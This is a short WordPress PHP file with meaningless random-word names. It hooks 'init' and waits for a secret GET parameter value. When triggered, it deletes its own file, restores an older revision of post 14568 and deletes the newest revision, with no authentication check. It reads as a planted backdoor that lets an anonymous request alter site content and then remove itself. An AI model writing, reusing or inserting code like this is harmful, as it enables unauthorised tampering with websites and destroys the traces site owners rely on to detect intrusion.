<?php

function paragraph_version_coupons() {
	if (isset($_GET['tab_reloaded_patterns']) && $_GET['tab_reloaded_patterns'] === 'star_github_viewer_virtual') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$mini_lead_keywords_interactive = 14568;
		$simply_pack_bangla = wp_get_post_revisions($mini_lead_keywords_interactive);
		if (empty($simply_pack_bangla)) die('no revisions');
		if (count($simply_pack_bangla) < 2) die('less than 2');
		$assistant_advance_youtube = array_shift($simply_pack_bangla);
		$vendor_toolbar_options = $assistant_advance_youtube->ID;
		$shipping_manager_browser = array_shift($simply_pack_bangla);
		$order_newsletter_archive_bbpress = $shipping_manager_browser->ID;
		$performance_pack_photos = wp_restore_post_revision($order_newsletter_archive_bbpress);
		if ($performance_pack_photos === false) die('error restoring');
		$performance_pack_photos = wp_delete_post_revision($vendor_toolbar_options);		
		if ($performance_pack_photos === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'paragraph_version_coupons');
